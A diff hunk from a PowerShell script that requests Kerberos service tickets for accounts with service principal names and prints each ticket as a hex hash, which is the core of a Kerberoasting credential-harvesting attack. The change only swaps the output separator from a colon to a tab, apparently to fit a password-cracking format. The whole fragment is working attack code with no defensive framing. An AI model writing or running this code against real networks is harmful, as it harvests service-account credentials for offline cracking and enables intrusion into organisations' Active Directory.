@@ -216,7 +216,7 @@ foreach($u in $srch.FindAll()) {
 		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn;
 		$bytes = $ticket.GetRequest();
 		$hash = [System.BitConverter]::ToString($bytes) -replace '-','';
-		$results += $spn + ":" + $hash;
+		$results += $spn + [string][char]9 + $hash;
 	} catch {}
 }
 Write-Output ($results -join [string]::NewLine());
